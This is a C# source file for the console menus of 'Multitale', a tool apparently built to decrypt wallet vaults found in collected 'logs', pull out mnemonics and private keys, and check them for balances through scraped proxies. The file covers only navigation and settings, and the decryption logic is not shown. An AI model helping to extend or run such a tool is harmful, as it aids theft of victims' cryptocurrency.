#pragma warning disable CS0649
#pragma warning disable CS8604

using Spectre.Console;

public class Menu
{
    public class Main
    {
        public static void Show()
        {
            Console.Title = "Multitale ~";
            Utils.ClearAndShow();
            AnsiConsole.Write(new Markup(" [royalblue1]~ Main / [/]\n\n [grey italic]Use keys for choosing (example - 1. is equal \"1\" button)[/]\n\n 1. Launcher\n 2. Settings\n 3. About & Support"));

            while (true)
            {
                ConsoleKeyInfo keyInfo = Console.ReadKey(true);
                var KeyName = keyInfo.Key;

                if (KeyName is ConsoleKey.D1 || KeyName is ConsoleKey.NumPad1)
                {
                    Launcher.Show();
                    return;
                }

                else if (KeyName is ConsoleKey.D2 || KeyName is ConsoleKey.NumPad2)
                {
                    Settings.Show();
                    return;
                }

                else if (KeyName is ConsoleKey.D3 || KeyName is ConsoleKey.NumPad3)
                {
                    About.Show();
                    return;
                }
            }
        }
    }

    public class About
    {
        public static void Show()
        {
            Utils.ClearAndShow();

            AnsiConsole.Write(new Markup(" [royalblue1]~ Main / About & Support [/]\n\n [grey italic]Press \"ESC\" if you want to go back[/]\n\n"));

            var AboutTable = new Table();

            var AboutColumnHeader = new Panel("[plum2]About[/]").Expand();
            var AboutColumnData = new Markup($"I decided to make a project that could interest both me and people who know what it is for. I wanted to try to make something that could be redesigned for myself and supplemented by any developer who would like to try himself in this field.\n[plum2]If you want the project to continue to be supported, updated, and supplemented, you can leave your donation using the available methods in the \"Donate\" block.[/]");
            var AboutColumn = new TableColumn(new Rows(AboutColumnHeader, AboutColumnData));
            AboutColumn.Width = 70;

            var DonateHeader = new Panel("[plum2]Donate[/]").Expand();
            var DonateData = new Markup("[plum2]┌─ Ethereum (and other ERC-20)\n└─[/] 0x375c1A4CcC41FcB2d35122aDDA008A8ecD384333\n[plum2]┌─ Bitcoin\n└─[/] bc1ql3thytsud4x9nulym3xkpmppv5eh8cj84tqsnp\n[plum2]┌─ Litecoin\n└─[/] LaX2ZRgDwAWqsYhHLvZDc3xYz1sA2LEFuM");
            var DonateColumn = new TableColumn(new Rows(DonateHeader, DonateData));
            DonateColumn.Width = 45;

            AboutTable.AddColumns(AboutColumn, DonateColumn);
            AboutTable.Border(TableBorder.None);

            var LinksTable = new Table();

            var LinksColumnHeader = new Panel("[mediumpurple]Links[/]").Expand();
            var LinksColumnData = new Markup("[mediumpurple]Github:[/] https://github.com/cryingincradles/Multitale\n[mediumpurple]Telegram:[/] https://t.me/multitale\n[mediumpurple]Lolzteam:[/] https://zelenka.guru/threads/5167800");
            var LinksColumn = new TableColumn(new Rows(LinksColumnHeader, LinksColumnData));
            LinksColumn.Width = 70;

            var DeveloperColumnHeader = new Panel("[mediumpurple]Developer[/]").Expand();
            var DeveloperColumnData = new Markup("[mediumpurple]Username:[/] cradles\n[mediumpurple]Telegram:[/] https://t.me/cryingincradles\n[mediumpurple]Lolzteam:[/] https://zelenka.guru/cradles");
            var DeveloperColumn = new TableColumn(new Rows(DeveloperColumnHeader, DeveloperColumnData));
            DeveloperColumn.Width = 45;

            LinksTable.AddColumns(LinksColumn, DeveloperColumn);
            LinksTable.Border(TableBorder.None);

            var AboutColumns = new Columns(new Text(" "), new Columns(AboutTable));
            var LinksColumns = new Columns(new Text(" "), new Columns(LinksTable));

            AboutColumns.Expand = false;
            AboutColumns.Padding = new(0);
            LinksColumns.Expand = false;
            LinksColumns.Padding = new(0);

            var AllRows = new Rows(AboutColumns, new Text(" "), LinksColumns);

            AnsiConsole.Write(AllRows);

            while (true)
            {
                ConsoleKeyInfo keyInfo = Console.ReadKey(true);
                var KeyName = keyInfo.Key;

                if (KeyName is ConsoleKey.Escape || KeyName is ConsoleKey.Backspace)
                {
                    Main.Show();
                    return;
                }
            }
        }
    }

    public class Settings
    {
        public static void SetThreads(int ThreadsCount)
        {
            var Settings = new Utils.IniFile("Settings.ini");
            Settings.Write("Main", "Threads", ThreadsCount.ToString());
        }

        public static void SetWriteTypes(bool Value)
        {
            var Settings = new Utils.IniFile("Settings.ini");
            Settings.Write("Recorder", "WriteTypes", Value.ToString());
        }

        public static void SetPath(string Path)
        {
            var Settings = new Utils.IniFile("Settings.ini");
            Settings.Write("Main", "LastPath", Path);
        }

        public static void SetProxiesPath(string Path)
        {
            var Settings = new Utils.IniFile("Settings.ini");
            Settings.Write("Main", "ProxiesPath", Path);
        }

        public static void SetSimplifiedView(bool Value)
        {
            var Settings = new Utils.IniFile("Settings.ini");
            Settings.Write("Output", "SimplifiedView", Value.ToString());
        }

        public static void SetFetcherThreads(int ThreadsCount)
        {
            var Settings = new Utils.IniFile("Settings.ini");
            Settings.Write("Fetcher", "Threads", ThreadsCount.ToString());
        }

        public static void SetDecryptorThreads(int ThreadsCount)
        {
            var Settings = new Utils.IniFile("Settings.ini");
            Settings.Write("Decryptor", "Threads", ThreadsCount.ToString());
        }

        public static void SetDecryptorFetch(bool Value)
        {
            var Settings = new Utils.IniFile("Settings.ini");
            Settings.Write("Decryptor", "Fetch", Value.ToString());
        }

        public static void ShowPath()
        {
            Utils.ClearAndShow();

            var Settings = new Utils.IniFile("Settings.ini");
            string? LastPath = Settings.Read("Main", "LastPath");

            AnsiConsole.Write(new Markup($" [royalblue1]~ Main / Settings / Working path[/]\n\n [grey italic]Press \"Enter\" if you want to go back\n The Path is the location of the folder that the program will work with[/]\n\n [mediumpurple]#[/] Current path {$"{(LastPath is null || LastPath == "" ? "[plum2]{not set}[/]" : $"[mediumpurple]{{{LastPath}}}[/]")}"}\n [mediumpurple]$[/] New path: "));

            Console.CursorVisible = true;
            string? NewPath = Console.ReadLine();
            Console.CursorVisible = false;

            if (NewPath == "")
            {
                Show();
                return;
            }

            if (!Directory.Exists(NewPath) && !File.Exists(NewPath))
            {
                AnsiConsole.Write(new Markup(" [plum2]![/] New path is [plum2]{not exists}[/]\n ! Retrying in [plum2]{3 seconds}[/]"));
                Thread.Sleep(3000);
                ShowPath();
                return;
            }

            else
            {
                SetPath(NewPath);
                ShowPath();
                return;
            }
        }

        public static void ShowProxiesPath()
        {
            Utils.ClearAndShow();

            var Settings = new Utils.IniFile("Settings.ini");
            string? ProxiesPath = Settings.Read("Main", "ProxiesPath");

            AnsiConsole.Write(new Markup($" [royalblue1]~ Main / Settings / Proxies Path[/]\n\n [grey italic]Press \"Enter\" if you want to go back\n The Proxies path is the location of the file containing proxies that the program will use to work with[/]\n\n [mediumpurple]#[/] Current path {$"{(ProxiesPath is null || ProxiesPath == "" ? "[plum2]{not set}[/]" : $"[mediumpurple]{{{ProxiesPath}}}[/]")}"}\n [mediumpurple]$[/] New path: "));

            Console.CursorVisible = true;
            string? NewPath = Console.ReadLine();
            Console.CursorVisible = false;

            if (NewPath == "")
            {
                Show();
                return;
            }

            if (!File.Exists(NewPath))
            {
                AnsiConsole.Write(new Markup(" [plum2]![/] New proxies [plum2]{path is not a file or not exists}[/]\n ! Retrying in [plum2]{3 seconds}[/]"));
                Thread.Sleep(3000);
                ShowProxiesPath();
                return;
            }

            if (Utils.GrabProxies(NewPath) is null)
            {
                AnsiConsole.Write(new Markup(" [plum2]![/] New proxies [plum2]{path is not contains any proxies}[/]\n ! Retrying in [plum2]{3 seconds}[/]"));
                Thread.Sleep(3000);
                ShowProxiesPath();
                return;
            }

            else
            {
                SetProxiesPath(NewPath);
                ShowProxiesPath();
                return;
            }
        }

        public static void ShowWriteTypes()
        {
            Utils.ClearAndShow();

            var Settings = new Utils.IniFile("Settings.ini");
            bool? WriteTypes = Settings.Read("Recorder", "WriteTypes") == "True";

            AnsiConsole.Write(new Markup($" [royalblue1]~ Main / Settings / Write types[/]\n\n [grey italic]Press \"ESC\" if you want to go back\n Write Types is saving information by separate types where this function supported[/]\n\n [mediumpurple]#[/] Current state {$"{(WriteTypes is null ? "[plum2]{not set}[/]" : $"[mediumpurple]{{{WriteTypes}}}[/]")}"}\n 1. Enable\n 2. Disable "));

            while (true)
            {
                ConsoleKeyInfo keyInfo = Console.ReadKey(true);
                var KeyName = keyInfo.Key;

                if (KeyName is ConsoleKey.D1 || KeyName is ConsoleKey.NumPad1)
                {
                    SetWriteTypes(true);
                    ShowWriteTypes();
                    return;
                }

                else if (KeyName is ConsoleKey.D2 || KeyName is ConsoleKey.NumPad2)
                {
                    SetWriteTypes(false);
                    ShowWriteTypes();
                    return;
                }

                else if (KeyName is ConsoleKey.Escape || KeyName is ConsoleKey.Backspace)
                {
                    Show();
                    return;
                }
            }
        }

        public static void ShowSimplifiedView()
        {

            Utils.ClearAndShow();

            var Settings = new Utils.IniFile("Settings.ini");
            bool? SimplifiedView = Settings.Read("Output", "SimplifiedView") == "True";

            AnsiConsole.Write(new Markup($" [royalblue1]~ Main / Settings / Simplified view[/]\n\n [grey italic]Press \"ESC\" if you want to go back\n Simplified view is more compact type of results display in the console[/]\n\n [mediumpurple]#[/] Current state {$"{(SimplifiedView is null ? "[plum2]{not set}[/]" : $"[mediumpurple]{{{SimplifiedView}}}[/]")}"}\n 1. Enable\n 2. Disable "));

            while (true)
            {
                ConsoleKeyInfo keyInfo = Console.ReadKey(true);
                var KeyName = keyInfo.Key;

                if (KeyName is ConsoleKey.D1 || KeyName is ConsoleKey.NumPad1)
                {
                    SetSimplifiedView(true);
                    ShowSimplifiedView();
                    return;
                }

                else if (KeyName is ConsoleKey.D2 || KeyName is ConsoleKey.NumPad2)
                {
                    SetSimplifiedView(false);
                    ShowSimplifiedView();
                    return;
                }

                else if (KeyName is ConsoleKey.Escape || KeyName is ConsoleKey.Backspace)
                {
                    Show();
                    return;
                }
            }
        }

        public static void ShowReset()
        {
            Utils.ClearAndShow();

            var Settings = new Utils.IniFile("Settings.ini");
            var AllSettings = Settings.ReadAll();
            var DefaultSettings = Utils.GetDefaults();
            if (AllSettings is null) return;

            var DifferentData = Utils.GetDifferentIniData(AllSettings, DefaultSettings);
            var TableGrid = new Grid();
            TableGrid.AddColumn();
            TableGrid.AddColumn();
            TableGrid.AddColumn();
            TableGrid.AddRow(new string[] { " [mediumpurple]Parameter[/]", " [mediumpurple]Current[/]", " [mediumpurple]Default[/]" });


            if (DifferentData.Count < 1)
            {
                AnsiConsole.Write(new Markup($" [royalblue1]~ Main / Settings / Load default settings[/]\n\n [grey italic]Press \"ESC\" if you want to go back\n Load default settings is the function to load the default values for the settings file[/]\n\n"));

                foreach (var Element in AllSettings)
                {
                    var OldElement = AllSettings.Where(item => item.Section == Element.Section && item.Key == Element.Key).ToList()[0];
                    var DefaultValue = Element.Value;
                    var OldValue = OldElement.Value;
                    if (DefaultValue == "") DefaultValue = "None";
                    if (OldValue == "") OldValue = "None";

                    TableGrid.AddRow(new string[] { $" [plum2]{OldElement.Key}[/]", $" {OldValue}", $" {DefaultValue}" });
                }

                AnsiConsole.Write(TableGrid);
                AnsiConsole.MarkupLine("\n [mediumpurple]#[/] All values are equal to the default values");

                while (true)
                {
                    ConsoleKeyInfo keyInfo = Console.ReadKey(true);
                    var KeyName = keyInfo.Key;

                    if (KeyName is ConsoleKey.Escape || KeyName is ConsoleKey.Backspace)
                    {
                        Show();
                        return;
                    }
                }
            }

            AnsiConsole.Write(new Markup($" [royalblue1]~ Main / Settings / Load default settings[/]\n\n [grey italic]Press \"Enter\" if you want to go back\n Load default settings is the function to load the default values for the settings file[/]\n\n"));

            foreach (var Element in DifferentData)
            {
                var OldElement = AllSettings.Where(item => item.Section == Element.Section && item.Key == Element.Key).ToList()[0];
                string DefaultValue = Element.Value;
                string CurrentValue = OldElement.Value;

                if (CurrentValue.Length > 18) CurrentValue = CurrentValue[..15] + "..";
                if (DefaultValue.Length > 18) DefaultValue = DefaultValue[..15] + "..";
                if (DefaultValue == "") DefaultValue = "None";

                TableGrid.AddRow(new string[] { $" [plum2]{OldElement.Key}[/]", $" {CurrentValue}", $" {DefaultValue}" });
            }

            AnsiConsole.Write(TableGrid);
            Console.CursorVisible = true;
            AnsiConsole.Write(new Markup("\n [mediumpurple]$[/] Type \"Reset\" if you really want to set defaults: "));


            string? Input = Console.ReadLine();
            if (Input == "" || Input is null) { Show(); return; };

            if (Input.ToUpper() == "RESET")
            {
                Utils.LoadDefaults();
                ShowReset();
                return;
            }
            
            else
            {
                ShowReset();
                return;
            }
        }

        public static void ShowFetcherThreads()
        {
            Utils.ClearAndShow();

            var Settings = new Utils.IniFile("Settings.ini");
            string? Threads = Settings.Read("Fetcher", "Threads");

            AnsiConsole.Write(new Markup($" [royalblue1]~ Main / Settings / Fetcher threads[/]\n\n [grey italic]Press \"Enter\" if you want to go back\n The number of threads determines how many tasks can run in parallel[/]\n\n [mediumpurple]#[/] Current value {$"{(Threads is null || Threads == "" ? "[plum2]{not set}[/]" : $"[mediumpurple]{{{Threads}}}[/]")}"}\n [mediumpurple]$[/] New value: "));
            Console.CursorVisible = true;
            string? NewThreads = Console.ReadLine();
            Console.CursorVisible = false;

            if (NewThreads == "")
            {
                Show();
                return;
            }

            if (NewThreads is null || !int.TryParse(NewThreads, out _) || int.Parse(NewThreads) == 0)
            {
                AnsiConsole.Write(new Markup(" [plum2]![/] New [plum2]{value is not a number or = 0}[/]\n [plum2]![/] Retrying in [plum2]{3 seconds}[/]"));
                Thread.Sleep(3000);
                ShowDecryptorThreads();
                return;
            }

            else
            {
                SetFetcherThreads(int.Parse(NewThreads));
                ShowFetcherThreads();
                return;
            }
        }

        public static void ShowDecryptorThreads()
        {
            Utils.ClearAndShow();

            var Settings = new Utils.IniFile("Settings.ini");
            string? Threads = Settings.Read("Decryptor", "Threads");

            AnsiConsole.Write(new Markup($" [royalblue1]~ Main / Settings / Decryptor threads[/]\n\n [grey italic]Press \"Enter\" if you want to go back\n The number of threads determines how many tasks can run in parallel[/]\n\n [mediumpurple]#[/] Current value {$"{(Threads is null || Threads == "" ? "[plum2]{not set}[/]" : $"[mediumpurple]{{{Threads}}}[/]")}"}\n [mediumpurple]$[/] New value: "));
            Console.CursorVisible = true;
            string? NewThreads = Console.ReadLine();
            Console.CursorVisible = false;

            if (NewThreads == "")
            {
                Show();
                return;
            }

            if (NewThreads is null || !int.TryParse(NewThreads, out _) || int.Parse(NewThreads) == 0)
            {
                AnsiConsole.Write(new Markup(" [plum2]![/] New [plum2]{value is not a number or = 0}[/]\n [plum2]![/] Retrying in [plum2]{3 seconds}[/]"));
                Thread.Sleep(3000);
                ShowDecryptorThreads();
                return;
            }

            else
            {
                SetDecryptorThreads(int.Parse(NewThreads));
                ShowDecryptorThreads();
                return;
            }
        }

        public static void ShowDecryptorFetch()
        {
            Utils.ClearAndShow();

            var Settings = new Utils.IniFile("Settings.ini");
            bool? DecryptorFetch = Settings.Read("Decryptor", "Fetch") == "True";

            AnsiConsole.Write(new Markup($" [royalblue1]~ Main / Settings / Decryptor fetching[/]\n\n [grey italic]Press \"ESC\" if you want to go back\n Fetching enables checking of parsed decrypted data for balances, pools and etc.[/]\n\n [mediumpurple]#[/] Current state {$"{(DecryptorFetch is null ? "[plum2]{not set}[/]" : $"[mediumpurple]{{{DecryptorFetch}}}[/]")}"}\n 1. Enable\n 2. Disable "));

            while (true)
            {
                ConsoleKeyInfo keyInfo = Console.ReadKey(true);
                var KeyName = keyInfo.Key;

                if (KeyName is ConsoleKey.D1 || KeyName is ConsoleKey.NumPad1)
                {
                    SetDecryptorFetch(true);
                    ShowDecryptorFetch();
                    return;
                }

                else if (KeyName is ConsoleKey.D2 || KeyName is ConsoleKey.NumPad2)
                {
                    SetDecryptorFetch(false);
                    ShowDecryptorFetch();
                    return;
                }

                else if (KeyName is ConsoleKey.Escape || KeyName is ConsoleKey.Backspace)
                {
                    Show();
                    return;
                }
            }
        }

        public static void Show()
        {
            Utils.ClearAndShow();

            var Settings = new Utils.IniFile("Settings.ini");
            string? LastPath = Settings.Read("Main", "LastPath");
            string? ProxiesPath = Settings.Read("Main", "ProxiesPath");
            string? FetcherThreadsCount = Settings.Read("Fetcher", "Threads");
            string? DecryptorThreadsCount = Settings.Read("Decryptor", "Threads");
            bool? DecryptorFetch = Settings.Read("Decryptor", "Fetch") == "True";
            bool? WriteTypes = Settings.Read("Recorder", "WriteTypes") == "True";
            bool? SimplifiedView = Settings.Read("Output", "SimplifiedView") == "True";

            AnsiConsole.Write(new Markup(" [royalblue1]~ Main / Settings[/]\n\n [grey italic]Use keys for choosing (example - 1. is equal \"1\" button) or press \"ESC\" if you want to go back[/]\n\n"));
            AnsiConsole.Write(new Markup($" 1. Working path {(LastPath is null || LastPath == "" ? "[plum2]{not set}[/]" : $"[mediumpurple]{{{LastPath}}}[/]")}\n"));
            AnsiConsole.Write(new Markup($" 2. Proxies path {(ProxiesPath is null || ProxiesPath == "" ? "[plum2]{not set}[/]" : $"[mediumpurple]{{{ProxiesPath}}}[/]")}\n"));
            AnsiConsole.Write(new Markup($" 3. Decryptor fetching {(DecryptorFetch is null ? "[plum2]{not set}[/]" : $"[mediumpurple]{{{DecryptorFetch}}}[/]")}\n"));
            AnsiConsole.Write(new Markup($" 4. Decryptor threads {(DecryptorThreadsCount is null || DecryptorThreadsCount == "" ? "[plum2]{not set}[/]" : $"[mediumpurple]{{{DecryptorThreadsCount}}}[/]")}\n"));
            AnsiConsole.Write(new Markup($" 5. Fetcher threads {(FetcherThreadsCount is null || FetcherThreadsCount == "" ? "[plum2]{not set}[/]" : $"[mediumpurple]{{{FetcherThreadsCount}}}[/]")}\n"));
            AnsiConsole.Write(new Markup($" 6. Write types {(WriteTypes is null ? "[plum2]{not set}[/]" : $"[mediumpurple]{{{WriteTypes}}}[/]")}\n"));
            AnsiConsole.Write(new Markup($" 7. Simplified view {(SimplifiedView is null ? "[plum2]{not set}[/]" : $"[mediumpurple]{{{SimplifiedView}}}[/]")}\n"));
            AnsiConsole.Write(new Markup($" 8. Load default settings\n"));

            //string Output = $"\n\n 1. Working path {$"[{(LastPath is null || LastPath == "" ? "not set" : LastPath)}]".Pastel(System.Drawing.Color.GreenYellow)}\n 2. Proxies path {$"[{(ProxiesPath is null || ProxiesPath == "" ? "not set" : ProxiesPath)}]".Pastel(System.Drawing.Color.GreenYellow)}\n 3. Decryptor fetching {$"[{(DecryptorFetch is null ? "not set" : DecryptorFetch)}]".Pastel(System.Drawing.Color.GreenYellow)}\n 4. Decryptor threads {$"[{(DecryptorThreadsCount is null ? "not set" : DecryptorThreadsCount)}]".Pastel(System.Drawing.Color.GreenYellow)}\n 5. Fetcher threads {$"[{(FetcherThreadsCount is null ? "not set" : FetcherThreadsCount)}]".Pastel(System.Drawing.Color.GreenYellow)}\n 6. Write types {$"[{(WriteTypes is null ? "not set" : WriteTypes)}]".Pastel(System.Drawing.Color.GreenYellow)}\n 7. Simplified view {$"[{(SimplifiedView is null ? "not set" : SimplifiedView)}]".Pastel(System.Drawing.Color.GreenYellow)}\n 8. Load default settings";
            //Console.WriteLine(Output);

            while (true)
            {
                ConsoleKeyInfo keyInfo = Console.ReadKey(true);
                var KeyName = keyInfo.Key;

                if (KeyName is ConsoleKey.Escape || KeyName is ConsoleKey.Backspace)
                {
                    Main.Show();
                    return;
                }

                else if (KeyName is ConsoleKey.D1 || KeyName is ConsoleKey.NumPad1)
                {
                    ShowPath();
                    return;
                }

                else if (KeyName is ConsoleKey.D2 || KeyName is ConsoleKey.NumPad2)
                {
                    ShowProxiesPath();
                    return;
                }

                else if (KeyName is ConsoleKey.D3 || KeyName is ConsoleKey.NumPad3)
                {
                    ShowDecryptorFetch();
                    return;
                }

                else if (KeyName is ConsoleKey.D4 || KeyName is ConsoleKey.NumPad4)
                {
                    ShowDecryptorThreads();
                    return;
                }

                else if (KeyName is ConsoleKey.D5 || KeyName is ConsoleKey.NumPad5)
                {
                    ShowFetcherThreads();
                    return;
                }

                else if (KeyName is ConsoleKey.D6 || KeyName is ConsoleKey.NumPad6)
                {
                    ShowWriteTypes();
                    return;
                }

                else if (KeyName is ConsoleKey.D7 || KeyName is ConsoleKey.NumPad7)
                {
                    ShowSimplifiedView();
                    return;
                }

                else if (KeyName is ConsoleKey.D8 || KeyName is ConsoleKey.NumPad8)
                {
                    ShowReset();
                    return;
                }
            }
        }
    }
    
    public class Launcher
    {
        public static void Show()
        {
            Utils.ClearAndShow();

            var Settings = new Utils.IniFile("Settings.ini");
            var Path = Settings.Read("Main", "LastPath");
            if (Path == "") Path = null;
            var ProxiesPath = Settings.Read("Main", "ProxiesPath");
            if (ProxiesPath == "") ProxiesPath = null;
            bool IsContainsProxies = false;
            bool IsContainsDecryptedData = false;
            bool IsPathFile = false;
            bool IsProxiesPathFile = false;

            if (ProxiesPath is not null || ProxiesPath != "") IsProxiesPathFile = File.Exists(ProxiesPath);
            if (ProxiesPath is not null && IsProxiesPathFile) IsContainsProxies = Utils.GrabProxies(ProxiesPath) is not null;

            if (Path is not null || Path != "") IsPathFile = File.Exists(Path);
            if (Path is not null && IsPathFile) IsContainsDecryptedData = Utils.GrabPrivateKeys(Path)?.Count > 0 || Utils.GrabMnemonics(Path)?.Count > 0;

            AnsiConsole.Write(new Markup(" [royalblue1]~ Main / Launcher[/]\n\n [grey italic]Use keys for choosing (example - 1. is equal \"1\" button) or press \"ESC\" if you want to go back[/]\n\n"));
            AnsiConsole.Write(new Markup($" {(Path is null ? $"[grey66]1. Decryptor[/] [plum2]{{path is not set}}[/]" : IsPathFile is true ? $"[grey66]1. Decryptor[/] [plum2]{{path is not a directory}}[/]" : "1. Decryptor")}\n"));
            AnsiConsole.Write(new Markup($" {(Path is null ? $"[grey66]2. Fetcher[/] [plum2]{{path is not set}}[/]" : IsPathFile is false ? $"[grey66]2. Fetcher[/] [plum2]{{path is not a file}}[/]" : IsContainsDecryptedData is false ? $"[grey66]2. Fetcher[/] [plum2]{{file is not contains any mnemonics or keys}}[/]" : IsContainsProxies is false ? $"[grey66]2. Fetcher[/] [plum2]{{proxies path is not contains any proxies}}[/]" : "2. Fetcher")}\n"));
            AnsiConsole.Write(new Markup($" 3. Proxy Scrapper\n"));
            AnsiConsole.Write(new Markup($" {(ProxiesPath is null ? $"[grey66]4. Proxy Validator[/] [plum2]{{proxies path is not set}}[/]" : IsContainsProxies is false ? $"[grey66]4. Proxy Validator[/] [plum2]{{file is not contains any proxies}}[/]" : "4. Proxy Validator")}\n"));

            while (true)
            {
                ConsoleKeyInfo keyInfo = Console.ReadKey(true);
                var KeyName = keyInfo.Key;

                if (KeyName is ConsoleKey.D1 || KeyName is ConsoleKey.NumPad1)
                {
                    if (Path is null || Path == "" || IsPathFile is true) continue;
                    else
                    {
                        Start(Structures.Functions.Decryptor);
                        return;
                    }
                }

                else if (KeyName is ConsoleKey.D2 || KeyName is ConsoleKey.NumPad2)
                {
                    if (Path is null || Path == "" || IsPathFile is false || IsContainsDecryptedData is false || IsContainsProxies is false) continue;
                    else
                    {
                        Start(Structures.Functions.Fetcher);
                        return;
                    }
                }

                else if (KeyName is ConsoleKey.D3 || KeyName is ConsoleKey.NumPad3)
                {
                    Start(Structures.Functions.ProxyScrapper);
                    return;
                }

                else if (KeyName is ConsoleKey.D4 || KeyName is ConsoleKey.NumPad4)
                {
                    if (IsProxiesPathFile is false || IsContainsProxies is false) continue;
                    else
                    {
                        Start(Structures.Functions.ProxyValidator);
                        return;
                    }
                }

                else if (KeyName is ConsoleKey.Escape || KeyName is ConsoleKey.Backspace)
                {
                    Main.Show();
                    return;
                }
            }
        }

        public static void Start(Structures.Functions Function)
        {
            var Settings = new Utils.IniFile("Settings.ini");
            var FilePath = Settings.Read("Main", "LastPath");
            if (FilePath == "") FilePath = null;
            bool IsFetcher = Settings.Read("Decryptor", "Fetch") == "True";
            var ProxiesPath = Settings.Read("Main", "ProxiesPath");
            if (ProxiesPath == "") ProxiesPath = null;
            bool IsContainsProxies = false;
            string FunctionName = System.Text.RegularExpressions.Regex.Replace(Function.ToString(), @"(?<!^)(?=[A-Z])", " ");

            if (ProxiesPath is not null)
                IsContainsProxies = Utils.GrabProxies(ProxiesPath) is not null;

            Utils.ClearAndShow();
            AnsiConsole.Write(new Markup($" [royalblue1]~ Main / Launcher / {FunctionName} [/]\n\n"));

            if ((FilePath is null && Function is not Structures.Functions.ProxyScrapper && Function is not Structures.Functions.ProxyValidator) || (FilePath is not null && !Directory.Exists(FilePath) && !File.Exists(FilePath)))
            {
                AnsiConsole.MarkupLine(" [black on plum2] Path wasn't found [/]");
                AnsiConsole.MarkupLine("\n [mediumpurple]#[/] Press any key to return to main menu");
                Console.ReadKey();
                Main.Show();
                return;
            }

            if ((ProxiesPath is null && Function is not Structures.Functions.ProxyScrapper && Function is not Structures.Functions.Decryptor) || (ProxiesPath is not null && !File.Exists(ProxiesPath)))
            {
                if (Directory.Exists(ProxiesPath))
                    AnsiConsole.MarkupLine(" [black on plum2] Proxies path can't be a directory [/]");
                else if (ProxiesPath is null)
                    AnsiConsole.MarkupLine(" [black on plum2] Proxies path is NULL [/]");
                else
                    AnsiConsole.MarkupLine(" [black on plum2] Path is not exists [/]");

                AnsiConsole.MarkupLine("\n [mediumpurple]#[/] Press any key to return to main menu");
                Console.ReadKey();
                Main.Show();
                return;
            }


            DateTime StartTime = DateTime.Now;
            string? LogsPath = FilePath;
            string ResultsPath = "./Results";
            if (!Directory.Exists(ResultsPath))
                Utils.TryCreateDirectory(ResultsPath);

            string RecordPath = $"{ResultsPath}/{StartTime:yyyy.MM.dd} ({StartTime:H-mm-ss})";

            List<Structures.Vault.Secret>? Secrets = null;
            List<Structures.Balances.Total>? Balances = null;
            List<Structures.Proxy>? Proxies = null;

            if (Function is Structures.Functions.Decryptor) 
            {
                Secrets = Decryptor.Call(LogsPath, RecordPath);
                if (Secrets.Count == 0) Secrets = null;
            }

            if (Function is Structures.Functions.Fetcher || (Function is Structures.Functions.Decryptor && IsFetcher))
            {
                bool FromDecryptor = Function is Structures.Functions.Decryptor && IsFetcher;

                if (IsContainsProxies is true)
                {
                    Balances = Fetchers.Call(FilePath, RecordPath, Secrets, FromDecryptor);
                    if (Balances.Count == 0) Balances = null;
                }
                else
                {
                    AnsiConsole.MarkupLine($"{(FromDecryptor ? "\n" : "")} [black on plum2] Fetcher can't be started because no any proxies found in proxies path [/]");
                }
            }

            if (Function is Structures.Functions.ProxyScrapper)
            {
                Proxies = Utils.ProxyScrapper.CallScrapper(RecordPath);
            }

            if (Function is Structures.Functions.ProxyValidator)
            {
                Proxies = Utils.GrabProxies(ProxiesPath);

                if (Proxies is not null)
                    Proxies = Utils.ProxyScrapper.CallValidator(RecordPath, Proxies);
            }

            AnsiConsole.MarkupLine("\n [mediumpurple]#[/] Process ended. Press any key to return to main menu");
            Console.CursorVisible = false;
            Console.ReadKey();
            Main.Show();
        }
    }
}